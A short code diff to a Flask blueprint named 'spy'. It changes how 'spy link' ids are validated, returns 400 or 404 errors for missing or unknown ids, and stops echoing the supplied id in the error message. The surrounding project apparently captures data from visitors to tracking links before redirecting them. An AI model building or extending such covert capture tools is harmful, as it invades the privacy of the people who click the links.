@@ -15,8 +15,8 @@ bp = Blueprint('spy', __name__)
 
 def _render_spy(link_id):
     links = load_json('links.json')
-    if link_id and link_id not in links:
-        return f"Invalid spy link: {link_id}", 404
+    if not link_id or link_id not in links:
+        return "Invalid or missing spy link. Use /s/<id>", 404
 
     link_data = links.get(link_id, {})
     target_url = link_data.get('url', 'https://google.com')
@@ -133,7 +133,10 @@ def _handle_capture(route_link_id=None):
 
 @bp.route('/', methods=['GET'])
 def index():
-    return _render_spy(request.args.get('id', ''))
+    link_id = request.args.get('id', '')
+    if not link_id:
+        return "Missing link id — use /s/<id>", 400
+    return _render_spy(link_id)
 
 
 @bp.route('/', methods=['POST'])
